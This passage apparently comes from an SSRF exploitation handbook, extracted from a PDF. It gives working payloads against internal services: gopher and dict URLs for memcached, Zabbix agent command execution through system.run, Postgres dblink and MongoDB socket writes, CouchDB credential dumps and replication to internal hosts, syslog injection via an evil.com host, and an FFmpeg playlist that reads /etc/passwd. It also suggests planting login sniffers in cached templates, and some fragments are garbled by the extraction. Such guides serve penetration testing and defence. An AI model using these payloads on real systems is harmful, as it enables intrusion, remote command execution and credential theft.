Basically restrictions which you may find in SSRF exploitation can be split into two groups: 
●
Input validation (such as regular expression URL filter) 
●
Network restrictions (firewalls rules) 
Input validation 
Unsafe redirect 
Easy way to bypass input validation is URL redirection. HTTP clients not a browsers. There are normally to do unsafe redirect
(except of Java case). 
Works fine for cURL, LWP, ASP.NET (exploit: ​http://anyhostwithredirest.com/​ ­> gopher://localhost:11211/1stats%0aquit). 
DNS pinning 
To bypass domain validation you may simple use pinning technique.  
For example, define A or AAAA records on your DNS server to your subdomains into victim’s intranet: 
$ nslookup local.oxod.ru 
Non­authoritative answer: 
Name: local.oxod.ru 
Address: ​127.0.0.1  
3.php 
]]> //valid footer for readable format 
15 
SMBRelay exploitation 
This technique described in related research “​SSRF + Java + Windows = Love​”. In case of Java­based application on OS 
Windows target, attacker can execute an NTLM relay attack over HTTP. It’s possible because Java has an internal HTTP­client, 
which supports NTLM authentication by default. 
Original request data sniffing 
In many cases there are useful to sniff data of initial request using SSRF. Its may be OAuth tokens, basic auth credential,
POST bodies and others. This problem can be solved if you have the ability to modify the server's response. You must be influence
the response from a one server, on receipt of a request from another server. It will look like open­redirect (WASC­38) or response
splitting/smuggling (WASC­25, WASC­27), but there are server’s http library such as cURL instead of the user's browser. 
307 HTTP status (Temporary Redirect Explained) and others can be used to retrieve original POST body. 
Table of POST redirection: 
Lib/Status 
300 
301 
302 
303 
304 
305 
306 
307 
308 
cURL 
OK 
­ 
­ 
­ 
­ 
OK 
OK 
OK 
­ 
LWP 
­ 
­ 
­ 
­ 
­ 
­ 
­ 
­ 
­ 
PHP 
­ 
­ 
­ 
­ 
­ 
­ 
­ 
­ 
­ 
16 
Example​: 
$url = "http://localhost/tests/redir.php?s={$_GET['s']}&r=http://localhost:8000/"; 
$ch = curl_init($url); 
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1); 
curl_setopt($ch, CURLOPT_POST, 1); 
curl_setopt($ch, CURLOPT_POSTFIELDS, "key=secret"); 
$resp = curl_exec($ch); 
You can steal “key=secret” data by using open redirect vulnerability with response statuses 300,305,306,307 or by http
response splitting/http header injection vulnerabilities. 
And there are no ways to steal secret in LWP case: 
use strict; use warnings;  
my $b=LWP::UserAgent­>new;  
my $u='http://localhost/tests/redir.php?s=307&r=http://localhost:8000/a' ; 
$b­>post($u,{'key'=>'secret'}); 
17 
Examples 
SSRF also open a gate to various NoSQL attacks such as ​Server­Side JavaScript injections​. 
Memcached 
Protocol documentation: ​https://github.com/memcached/memcached/blob/master/doc/protocol.txt 
Exploitation steps:  
1.
collect all keys 
2.
determine interesting keys 
3.
replace key’s values to arbitrary 
Exploitations techniques: 
●
Find HTML templates and inject JS login sniffer to collect login/passwords 
●
Find dynamic templates (macros, PHP, others) and inject arbitrary code (RCE) 
●
Find your session and escalate your privileges 
●
Create new session with long expiration and set admin privileges 
Exploits 
gopher://localhost:11211/1%0astats%0aquit 
dict://locahost:11211/stats 
ldap://localhost:11211/%0astats%0aquit 
18 
PHP­FPM 
Exploit local installation to bypass restrictions such as safe_mode and others 
http://pastebin.com/XP2BYmR7  
Syslog 
Typically UDP but really common listen on TCP port 514. You may add strings to syslog easily. 
Exploit 
http://string­that­you­want­to­add.evil.com:514/ 
First configure DNS to resolve string­that­you­want­to­add.evil.com as 127.0.0.1 
HTTP request: 
GET /a HTTP/1.1 
Host: string­that­you­want­to­add.evil.com:8000 
Connection: Keep­Alive 
Syslog entities: 
Nov 23 00:53:50 localhost Host: string­that­you­want­to­add.evil.com:8000#015 
Nov 23 00:53:50 localhost Connection: Keep­Alive#015 
Nov 23 00:53:50 localhost #015 
CRLF injection make syslog entities more clear (see below). 
Exploits 
dict://localhost:514/ALARM!!! 
ldap://localhost:514/\r\nALARM!!! (LWP only) 
Syslog entities: 
Nov 23 00:53:50 localhost ALARM!!!#015 
19 
Zabbix agentd 
Zabbix is very common monitoring system. Monitored servers running zabbix_agentd binary which configured by
/etc/zabbix/zabbix_agentd.conf file.  
Default listened port is 10050. Zabbix agentd have only host­based authorization, described in config file: 
Server=127.0.0.1,monitor.trusted.network.net 
There are typically to include 127.0.0.1 into authorized servers by debugging reasons and by default. 
Agentd protocol is plain/text and simple: “\n” using as line terminator and packet format is “item[key]”. All available items listed
below: ​http://www.zabbix.com/documentation/1.8/manual/config/items​. Zabbix agentd close socket after first malformed line (request
unexisting key for example). So you can’t use smuggling if first line of request is not controlled by you. 
Sometimes agentd configured to run arbitrary commands from servers (item system.ru used to run commands from key
argument): 
EnableRemoteCommands=1 
Exploits 
gopher://localhost:10050/1vfs.file.regexp[/etc/hosts,7] 
Server response: 
ZBXD?127.0.0.1
localhost ads.localhost localhost.vv asd.localhost.vv 
gopher://localhost:10050/1system.run[ls] 
Server response: 
ZBXD,usr 
etc 
var 
boot 
20 
Postgres 
Any functions which can open sockets and write user’s data into it can be exploited for SSRF. Such as functions to external
database connections which provided by all modern databases (DB2/Oracle/Postgres/etc). Attacker may use this functions through
SQL injection to exploit anything in intranet.  
DBLINK
desciption:
​http://www.postgresql.org/docs/8.4/static/dblink.html​.
Syntax
of
connection
string
available
here:
http://www.postgresql.org/docs/8.4/static/libpq­connect.html  
Exploits 
SELECT
dblink_send_query('host=127.0.0.1
dbname=quit
user=\'​\nstats\n​\'
password=1 port=11211 sslmode=disable','select
version();'); 
MongoDB 
Attacker may use different internal functions, such as copyDatabase() and others to open arbitrary socket and puts arbitrary 
data into it.  
Exploits 
Write binary data into socket: 
> db.copyDatabase("​\1\2\3\4\5\6\7​",'test','localhost:8000') 
$ nc ­l 8000 | hexdump ­C 
00000000  3b 00 00 00 28 00 00 00  00 00 00 00 d4 07 00 00  |;...(...........| 
00000010  00 00 00 00 ​01 02 03 04  05 06 07​ 2e 73 79 73 74  |............syst| 
00000020  65 6d 2e 6e 61 6d 65 73  70 61 63 65 73 00 00 00  |em.namespaces...| 
Communicate with memcached: 
> db.copyDatabase(“\nstats\nquit”,’test’,’localhost:11211’) 
21 
CouchDB 
CouchDB is really cool target for SSRF attacks. There are HTTP REST API which provide attacker to exploit it using only 
valid HTTP requests without any smuggling. API details: ​http://wiki.apache.org/couchdb/Complete_HTTP_API_Reference​. 
POST/PUT/DELETE requests may be forged also by smuggling techniques to execute server­side JS code for example. 
Exploits 
http://localhost:5984/_users/_all_docs​ to steal _users database with credentials: 
HTTP/1.1 200 OK 
Server: CouchDB/1.2.0 (Erlang OTP/R15B01) 
ETag: "BD1WV12007V05JTG4X6YHIHCA" 
Date: Tue, 18 Dec 2012 21:39:59 GMT 
Content­Type: text/plain; charset=utf­8 
Cache­Control: must­revalidate 
{"total_rows":1,"offset":0,"rows":[ 
{"id":"_design/_auth","key":"_design/_auth","value":{"rev":"1­a8cfb993654bcc635f126724d39eb930"}} 
]} 
This example tested on debian stable installation from package without any additional configuration. 
To execute server­side JS with restrictions (server­side JS is sandboxed, no network, IO nor access outside the provided 
document and functions) you may use View API. This technique was described at BHUS11 in ​this paper ​for web­application based 
injection. Read this first: ​http://wiki.apache.org/couchdb/HTTP_view_API 
22 
Attacker could also send requests from CouchDB server to intranet by using replication function 
(​http://docs.couchdb.org/en/stable/api/server/common.html#replicate​).  
POST http://couchdb:5984/_replicate 
Content­Type: application/json 
Accept: application/json 
{ 
    "source" : "recipes", 
    "target" : "http://ssrf­me:11211/recipes", 
} 
23 
FFmpeg 
M38u file format provides some useful macros called “EXTINF”. This macros allows attacker to read arbitrary files and 
do SSRF attacks. Let’s look at some beautiful examples listed below: 
$ cat video.mp4 
#EXTM3U 
#EXT­X­MEDIA­SEQUENCE:0 
#EXTINF:10.0, 
concat:http://example.org/header.y4m|file:///etc/passwd 
#EXT­X­ENDLIST 
$ ffmpeg ­i video.mp4 thumbnail.png 
$ ffmpeg ­i thumbnail.png out.y4m 
$ cat out.y4m 
YUV4MPEG2 W30 H30 F25:1 Ip A0:0 Cmono 
FRAME 
# $FreeBSD: release/10.0.0/etc/master.passwd 256366 
,! 2013­10­12 06:08:18Z rpaulo $ 
# 
root:*:0:0:Charlie &:/root:/usr/local/bin/zsh 
toor:*:0:0:Bourne­again Superuser:/root: 
Original link: ​https://bugs.launchpad.net/ubuntu/+source/ffmpeg/+bug/1533367  
24 
References 
1.
http://en.wikipedia.org/wiki/URI_scheme 
2.
http://en.wikipedia.org/wiki/List_of_TCP_and_UDP_port_numbers 
3.
http://msdn.microsoft.com/en­us/library/system.uri.scheme.aspx 
4.
http://search.cpan.org/~gaas/libwww­perl­6.04/lib/LWP.pm 
5.
http://php.net/manual/en/wrappers.php 
6.
http://docs.oracle.com/javase/1.5.0/docs/api/javax/print/attribute/standard/ReferenceUriSchemesSupported.html 
7.
http://www.kernel.org/doc/man­pages/online/pages/man2/open.2.html  
8.
http://media.blackhat.com/bh­us­11/Sullivan/BH_US_11_Sullivan_Server_Side_WP.pdf  
9.
http://www.nostarch.com/download/tangledweb_ch3.pdf  
Tools 
1.
https://github.com/ONsec­Lab/scripts/blob/master/list­open­fd.c  
Researches  
2
1.
http://www.shmoocon.org/2008/presentations/Web%20portals,%20gateway%20to%20information.ppt  
2.
http://www.slideshare.net/d0znpp/xxe­advanced­exploitation  
3.
http://www.slideshare.net/d0znpp/caro2012­attack­largemodernwebapplications  
4.
http://media.blackhat.com/bh­us­12/Briefings/Polyakov/BH_US_12_Polyakov_SSRF_Business_Slides.pdf 
5.
http://erpscan.com/wp­content/uploads/2012/11/SSRF.2.0.poc_.pdf  
6.
http://www.riyazwalikar.com/2012/11/cross­site­port­attacks­xspa­part­2.html  
7.
http://www.slideshare.net/d0znpp/ssrf­attacks­and­sockets­smorgasbord­of­vulnerabilities  
8.
http://erpscan.com/press­center/smbrelay­bible­7­ssrf­java­windows­love/ 
9.
https://bugs.launchpad.net/ubuntu/+source/ffmpeg/+bug/1533367  
2 Sorted by date 
25